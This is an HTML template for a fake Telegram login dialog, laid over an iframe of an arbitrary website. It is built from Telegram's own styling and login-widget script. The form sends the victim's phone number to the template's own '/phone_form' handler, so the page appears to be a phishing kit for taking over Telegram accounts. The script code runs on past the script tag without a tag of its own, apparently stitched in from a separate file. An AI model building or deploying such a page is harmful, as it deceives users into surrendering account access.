<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Авторизация Telegram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="format-detection" content="telephone=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="MobileOptimized" content="176" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="robots" content="noindex, nofollow" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css">
    <link href="https://telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
    <link href="https://telegram.org/css/bootstrap-extra.css?2" rel="stylesheet">
    <link href="https://telegram.org/css/telegram.css?231" rel="stylesheet">
    <link href="../static/css/oauth.css?14" rel="stylesheet">
    <link rel="stylesheet" href="../static/css/style.css">

  </head>
  <body>
    <div class="holder">
        <iframe src="{{bg_link}}" frameborder="0"></iframe>
        <div class="modal" role="dialog">
          <div class="modal-dialog" role="document">
            <div class="modal-content">
              <div class="modal-body">
                <main class="login">
                  <section class="login_content" id="login-container">
                    <div class="login_photos"><span class="login_telegram_photo_wrap arrowed"><i class="login_telegram_photo"></i></span><a href="{{link}}" target="_blank"><i class="login_bot_photo bgcolor2" data-content="L"><img src="../static/images/{{img}}"></i></a></div>
                    <div class="login_header_text" id="header-text"></div>
                    <div class="login_confirm_text" id="login-text"></div>
                    
                    <form id="send-form" class="login_form" method="POST" action="/phone_form">
                      <div class="login_form_group" id="login-form-group">
                        <div class="login_country_field_wrap" id="login-country-wrap">
                          <div class="login_country_select" id="login-country-selected" data-placeholder="Unknown country"></div>
                          <div class="login_country_search_wrap">
                            <div class="textfield-item" id="login-country-search-textfield">
                              <input type="text" class="form-control" id="login-country-search" autocomplete="off" placeholder="Search" />
                              <div class="textfield-item-underline"></div>
                            </div>
                            <div class="login_country_search_results" id="login-country-search-results" data-noresult="Unknown country"></div>
                          </div>
                        </div>
                        <div class="login_phone_field_wrap">
                          <div class="login_code_field_wrap">
                            <div class="textfield-item" id="login-phone-code-textfield">
                              <input type="tel" name="phone-code" class="form-control" id="login-phone-code" autocomplete="off"/>
                              <div class="textfield-item-underline"></div>
                            </div>
                          </div><div class="login_number_field_wrap">
                            <div class="textfield-item" id="login-phone-textfield">
                              <input type="tel" name="phone" class="form-control" id="login-phone" autocomplete="off"/>
                              <div class="textfield-item-underline"></div>
                              <label class="textfield-item-placeholder" id="login-phone-placeholder" data-placeholder="Phone number"></label>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="login_button_wrap">
                        <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)"   type="button">
                          <span class="button-item-label" id="cancel"></span>
                          <span class="ripple-mask"><span class="ripple"></span></span>
                        </button>
                        <button class="button-item ripple-handler" type="submit">
                          <span class="button-item-label" id="next"></span>
                          <span class="ripple-mask"><span class="ripple"></span></span>
                        </button>
                      </div>
                    </form>
                    {% if error %}
                      <div style="margin-top: 20px;
                      font-family: 'Roboto', sans-serif;
                      text-align: center;
                      font-size: 13px;">
                        {{ error }}
                      </div>
                    {% endif %}
                  </section>
                    </main>
              </div>
            </div>
          </div>
        </div>
    </div>
    <script src="../static/js/oauth.js"></script>

function showLoginError(error_text) {
  getEl('login-phone-code-textfield').classList.add('is-invalid');
  getEl('login-phone-textfield').classList.add('is-invalid');
  getEl('login-alert').innerHTML = error_text;
}
function requestConfirmation(event) {
  event && event.preventDefault();
  getEl('login-phone-code-textfield').classList.remove('is-invalid');
  getEl('login-phone-textfield').classList.remove('is-invalid');
  getEl('login-alert').innerHTML = '';
  var code = getEl('login-phone-code').value;
  var phone = getEl('login-phone').value;
  ajax('/auth/request?bot_id=877588973&origin=https%3A%2F%2Flolz.guru', {
    phone: (code + phone).replace(/[^0-9]+/g, '')
  }, function() {
    openConfirmation();
  }, function(xhr) {
    showLoginError(xhr.responseText || 'Server error');
  });
  return false;
}
function openConfirmation() {
  var code = getEl('login-phone-code').value;
  var phone = getEl('login-phone').value;
  getEl('login-phone-field').innerHTML = (code.length > 1 ? code + ' ' : code) + phone;
  getEl('send-form').classList.add('hide');
  getEl('login-form').classList.remove('hide');
  checkAuth();
}
function cancelConfirmation(event) {
  event && event.preventDefault();
  getEl('login-phone-field').innerHTML = '';
  getEl('send-form').classList.remove('hide');
  getEl('login-form').classList.add('hide');
  getEl('login-phone').focus();
  clearTimeout(window.authTimeout);
  ajax('/auth/cancel?bot_id=877588973&origin=https%3A%2F%2Flolz.guru', {});
  return false;
}
function checkAuth() {
  clearTimeout(window.authTimeout);
  window.authTimeout = setTimeout(function doCheckAuth() {
    ajax('/auth/login?bot_id=877588973&origin=https%3A%2F%2Flolz.guru', {}, function(result) {
      if (result) {
        location.reload();
      } else {
        checkAuth();
      }
    }, function (xhr) {
      cancelConfirmation();
      showLoginError(xhr.responseText || 'Server error');
    });
  }, 700);
}
function loginCancel(e) {
  window.location.href = '{{link}}';
}
var userLang = navigator.language || navigator.userLanguage;

region = userLang.split('-')[1]
lang = userLang.split('-')[0]

if (typeof region == 'undefined')
  inputFormatPhoneInit(lang.toUpperCase(), "", lang);
else
  inputFormatPhoneInit(region.toUpperCase(), "", lang);

if (lang == 'ru') {
  document.getElementById('header-text').innerHTML = 'Войдите, чтобы использовать аккаунт Telegram для<br> {{site}} и <a class="bot_name" href="{{link}}" target="_blank">{{name}}</a>.';
  document.getElementById('login-text').innerHTML = 'Введите свой <b>номер телефона</b> в <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">международном формате</a>. Подтверждение будет отправлено в Telegram.';
  document.getElementById('cancel').innerHTML = 'Отмена';
  document.getElementById('next').innerHTML = 'Далее';
} else {
  document.getElementById('header-text').innerHTML = 'Log in to use your Telegram account with<br> {{site}} and <a class="bot_name" href="{{link}}" target="_blank">{{name}}</a>.';
  document.getElementById('login-text').innerHTML = 'Please enter your <b>phone number</b> in <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">international format </a>and we will send a confirmation message to your account via Telegram.';
  document.getElementById('cancel').innerHTML = 'Cancel';
  document.getElementById('next').innerHTML = 'Next';
}
